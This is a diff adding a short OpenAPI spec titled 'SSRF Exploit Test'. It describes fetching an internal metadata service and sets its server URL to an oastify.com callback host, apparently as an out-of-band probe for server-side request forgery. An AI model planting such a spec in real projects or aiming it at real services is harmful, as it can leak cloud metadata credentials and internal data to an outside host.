@@ -1,0 +1,15 @@
+openapi: "3.0.0"
+info:
+  title: SSRF Exploit Test
+  version: "1.0.0"
+paths:
+  /:
+    get:
+      summary: "Test SSRF by requesting internal metadata service"
+      responses:
+        '200':
+          description: "Successfully fetched metadata"
+        '404':
+          description: "Could not fetch metadata"
+servers:
+  - url: "fl4n6j6ocwmj85o6ak2rp97tpkvbjb70.oastify.com"
